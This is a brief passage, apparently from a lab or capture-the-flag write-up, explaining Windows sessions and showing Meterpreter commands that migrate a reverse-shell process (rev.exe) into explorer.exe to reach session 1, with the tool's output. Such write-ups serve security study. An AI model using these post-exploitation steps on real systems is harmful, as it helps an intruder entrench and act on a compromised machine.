Windows has a concept of sessions, and each process will be in one. Running `ps` in meterpreter will show which session each process is in: `rev.exe` is in session 0. To get into session 1, I’ll `migrate` into a process there. `explorer.exe` seems like a good candidate:

```jsx
meterpreter > migrate -N explorer.exe
[*] Migrating from 3788 to 3276...
[*] Migration completed successfully.
```

```jsx
meterpreter > migrate <explorerpid>
```
